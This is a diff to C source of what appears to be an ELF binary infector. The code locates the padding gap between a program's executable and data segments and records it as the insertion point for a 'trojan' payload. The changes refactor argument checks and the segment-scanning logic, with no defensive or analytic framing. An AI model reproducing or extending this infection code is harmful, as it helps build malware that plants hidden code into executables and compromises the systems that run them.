@@ -33,8 +33,9 @@ long * _inf_get_inf_magik(uint8_t *trojan, size_t len, long match)
     return NULL;
 }
 
-infect_t *inf_load(elf_t *elfo, FILE *infection) {
-    ASSERT_CON_NULL(elfo);
+infect_t *inf_load(elf_t *elfo, FILE *infection, open_mode_t m) {
+    ASSERT_CON_RET_NULL(m == F_RW);
+    ASSERT_ARG_RET_NULL(elfo);
     infect_t *inf = scalloc(1, sizeof(infect_t));
     struct mapped_file file_data;
 
@@ -49,39 +50,42 @@ infect_t *inf_load(elf_t *elfo, FILE *infection) {
 }
 
 elf_off_t inf_scan_segment(infect_t *inf) {
-    ASSERT_CON_RET_FALSE(inf && inf->elfo);
+    ASSERT_ARG_RET_VAL(inf && inf->elfo, 0);
 
     elf_ehdr_t *ehdr = inf->elfo->ehdr;
     elf_phdr_t **phdrs = inf->elfo->phdrs;
     elf_phdr_t *pdata = *phdrs;
     elf_phdr_t *pdata_after_check = NULL;
     elf_off_t len = 0;
-    bool pass_check = false, found = false;
+    bool pass_check = false;
+    short found = 0;
 
-    for (int i = 0; i < ehdr->e_phnum && len == 0; ++i, (*phdrs)++) {
-        pdata = *phdrs;
-        /** .text */
-        if (!found && pdata->p_type == PT_LOAD /* code */ && pdata->p_flags == (PF_R|PF_X))
+    for (int i = 0; i < ehdr->e_phnum && len == 0; ++i) {
+        pdata = (*phdrs)++;
+        /** .text? */
+        if (!(found & PF_X) && pdata->p_type == PT_LOAD /* code */ && pdata->p_flags == (PF_R|PF_X))
         {
             inf->pad.inf_target_offset = pdata->p_offset + pdata->p_filesz;
             /** If ELF is .so = ehdr->e_type */
             inf->pad.so_addr = inf->pad.inf_target_offset;
-            /** If ELF is EXEC = ehdr->e_type, p_filesz: Sie of segment in disk */
+            /** If ELF is EXEC = ehdr->e_type, p_filesz: Size of segment in disk */
             inf->pad.lsb_exec_addr = pdata->p_vaddr + pdata->p_filesz;
 
             /** Save it for now, will write later if check is OK */
             pdata_after_check = pdata;
-            found = true;
+            found |= PF_X;
+            continue;
         }
-        /** .data
-         *  It should come just in the next loop after .text
-         * */
-        if (found && pdata->p_type == PT_LOAD && pdata->p_flags == (PF_R|PF_W))
+         /** .data should come just in the next loop after .text */
+        if ((found & PF_X) && pdata->p_type == PT_LOAD && pdata->p_flags == (PF_R|PF_W)) {
             /** Total padding size (zeroes) between .text and .data */
             len = pdata->p_offset - inf->pad.so_addr;
+            found |= PF_W;
+            break;
+        }
     }
-    if (!found) {
-        log_error("Unexpected section\n");
+    if (!(found & PF_X) || !(found & PF_W)) {
+        log_error("Unexpected or missing section(s)\n");
         return false;
     }
 
@@ -106,9 +110,8 @@ elf_off_t inf_scan_segment(infect_t *inf) {
     return (pass_check ? inf->pad.inf_pading_size = len : 0);
 }
 
-bool inf_load_and_patch(infect_t *inf, open_mode_t m, long magic) {
+bool inf_load_and_patch(infect_t *inf, long magic) {
     ASSERT_CON_RET_FALSE(inf && inf->elfo);
-    ASSERT_CON_RET_FALSE(m == F_RW);
 
     bool rc = false;
     elf_ehdr_t *ehdr = inf->elfo->ehdr;
